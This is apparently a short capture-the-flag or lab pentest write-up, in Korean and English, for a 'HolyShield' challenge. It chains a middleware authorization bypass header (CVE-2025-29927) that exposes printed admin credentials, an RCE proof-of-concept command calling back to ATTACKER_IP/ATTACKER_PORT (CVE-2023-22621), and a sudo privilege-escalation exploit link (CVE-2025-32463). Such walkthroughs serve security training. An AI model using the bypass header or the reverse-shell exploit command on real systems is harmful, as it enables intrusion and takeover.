# HolyShield Pentest Challenge

## 1. Initail Access

### 1-1. Get Admin Credential from Admin Pannel

x-middleware-subrequest 헤더를 함하여 /admin 경로에서 크레덴셜 확인 (CVE-2025-29927)

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

```
title: Veritas Mobile
Full Name: Administrator
Email: veritasmobile@veritas.com
password: P@ssw0rd13579c4ts3cur1ty!
```

### 1-2. RCE via CVE-2023-22621

orpheus 유저 권한 획득
`https://github.com/sofianeelhor/CVE-2023-22621-POC`

```sh
python3 poc.py -url http://localhost:1337/ -u "veritasmobile@veritas.com" -p 'P@ssw0rd13579c4ts3cur1ty!' -ip ATTACKER_IP -port ATTACKER_PORT
```

### 1-3. LPE via CVE-2025-32463

sudo 에서 발생한 권한상승 취약점(CVE-2025-32463)
`https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main`